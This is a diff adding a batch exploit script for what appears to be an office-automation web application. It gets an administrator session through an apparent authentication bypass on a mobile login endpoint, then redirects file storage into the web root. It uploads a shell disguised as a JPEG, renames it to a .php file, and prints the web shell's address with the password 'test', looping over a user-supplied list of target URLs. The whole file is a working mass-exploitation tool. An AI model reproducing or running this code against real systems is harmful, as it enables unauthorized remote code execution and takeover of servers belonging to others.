@@ -1,0 +1,121 @@
+#define payload = /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
+#define yinhao = "
+#define Rootre = <td nowrap class="TableData">(.*?)</td>
+#define contentidre = "TableLine1" index="(.*?)" >
+#define attachmentidre = ATTACHMENT_ID_OLD" value="(.*?),"
+#define shellpathre = alt="(.*?)" node-image-tips
+function GetCookie(url){
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	if(StrFindStr(res[1],"PHPSESSID",0) == "-1"){
+		return "";
+	}
+	PHPSESSID = GettextMiddle(res[1],"PHPSESSID=",";");
+	return PHPSESSID;
+}
+function JudgeOK(url,Cookie){
+	res = HttpGet(url."/general/",Cookie);
+	if(StrFindStr(res[0],"/static/js/ba/agent.js",0) == "-1"){
+		return "0";
+	}else{
+		return "1";
+	}
+
+}
+function GetRoot(content){
+	list = StrRe(content,Rootre);
+	num = GetArrayNum(list);
+	num = num/2;
+	i = 0;
+	while(i<num){
+		if(StrFindStr(list[ToInt(i*2+1)],":\",0) != "-1"){
+			return list[ToInt(i*2+1)];
+		}
+		i = i+1;
+	}
+	return "";
+}
+function GetWebRoot(url,Cookie){
+	res = HttpGet(url."/general/system/reg_view/",Cookie);
+	return GetRoot(res[0]);
+}
+function AddPath(url,Root,Cookie){
+	return HttpPost(url."/general/system/attachment/position/add.php","POS_ID=166&POS_NAME=166&POS_PATH=".URLEncode(Root."\WebRoot")."&IS_ACTIVE=on",Cookie);
+}
+function AddImgPath(url,Root,Cookie){
+	return HttpPost(url."/general/system/picture/new/submit.php","TO_ID=&TO_NAME=&PRIV_ID=&PRIV_NAME=&COPY_TO_ID=admin%2C&COPY_TO_NAME=%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1%2C&PIC_NAME=test&PIC_PATH=".URLEncode(Root."\webRoot")."&ROW_PIC=5&ROW_PIC_NUM=7",Cookie);
+}
+function PushImg(url,Content,Cookie){
+	return HttpPost(url."/general/file_folder/new/submit.php",Content,Cookie.StrRN()."Content-Type: multipart/form-data; boundary=---------------------------33072116513621237124579432636");
+}
+function GetPICID(url,Cookie){
+	res = HttpGet(url."/general/picture/tree.php?CUR_DIR=&PIC_ID=&_=1615284234507",Cookie);
+	return GettextMiddle(res[0],"&PIC_ID=",yinhao);
+}
+function GetImg(url,Root,Cookie){
+	res = HttpGet(url."/general/picture/picture_view.php?SUB_DIR=2103&PIC_ID=".GetPICID(url,Cookie)."&CUR_DIR=".URLEncode(StrReplace(Root,"\\","/"))."%2Fwebroot%2Ffile_folder%2F2103",Cookie);
+	list = StrRe(res[0],shellpathre);
+	num = GetArrayNum(list);
+	num = num/2;
+	i = 0;
+	while(i<num){
+		if(StrFindStr(list[ToInt(i*2+1)],"1.jpg",0) != "-1"){
+			return list[ToInt(i*2+1)];
+		}
+		i = i+1;
+	}
+	return "";
+}
+function ChangeImgName(url,CONTENT,ATTACHMENT,Cookie){
+	return HttpPost(url."/general/file_folder/rename_submit.php","NEW_FILE_NAME=166&CONTENT_ID=".CONTENT."&FILE_SORT=2&ATTACHMENT_ID=".URLEncode(ATTACHMENT)."&ATTACHMENT_NAME_POSTFIX=php.&ATTACHMENT_NAME=1.jpg&FIRST_ATTACHMENT_NAME=1&FILE_NAME_OLD=1.jpg",Cookie);
+}
+function GetCONTENTID(url,Cookie){
+	res = HttpGet(url."/general/file_folder/folder.php?FILE_SORT=2&SORT_ID=0",Cookie);
+	list = StrRe(res[0],contentidre);
+	if(GetArrayNum(list) >= 2){
+		return list[1];
+	}
+	return "";
+}
+function GetATTACHMENTID(url,CONTENTID,Cookie){
+	res = HttpGet(url."/general/file_folder/edit.php?FILE_SORT=2&SORT_ID=0&CONTENT_ID=".CONTENTID."&start=0",Cookie.StrRN()."Referer: ".url."/general/file_folder/folder.php?FILE_SORT=2&SORT_ID=0");
+	list = StrRe(res[0],attachmentidre);
+	if(GetArrayNum(list) >= 2){
+		return list[1];
+	}
+	return "";
+}
+function GetShell(url){
+	PHPSESSID = GetCookie(url);
+	if(PHPSESSID == ""){
+		return "";
+	}
+	Cookie = "Cookie: PHPSESSID=".PHPSESSID.";".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0";
+	if(JudgeOK(url,Cookie)=="1"){
+		WebRoot = GetWebRoot(url,Cookie);
+		AddPath(url,WebRoot,Cookie);
+		AddImgPath(url,WebRoot,Cookie);
+		ShellPost = ReadFile("script\综合漏洞\OAShell.txt");
+		PushImg(url,ShellPost,Cookie);
+		path = GetImg(url,WebRoot,Cookie);
+		CONTENTID = GetCONTENTID(url,Cookie);
+		ATTACHMENTID=GetATTACHMENTID(url,CONTENTID,Cookie);
+		ChangeImgName(url,CONTENTID,ATTACHMENTID,Cookie);
+		realshellpath = url."/file_folder/2103/".StrReplace(path,"1.jpg","166.php");
+		print("Shell路径:",realshellpath,"密码:test");
+	}else{
+		return "";
+	}
+}
+function main(args){
+	print("请输入要要检测的列表文件:");	
+	list = StrSplit(ReadFile(input()),StrRN());
+	i = 0;
+	num = GetArrayNum(list);
+	while(i < num){
+		url=list[ToInt(i)];
+		print("当前检测的连接:".url);
+		GetShell(url);
+		i=i+1;
+	}
+	print("检测完毕");
+}
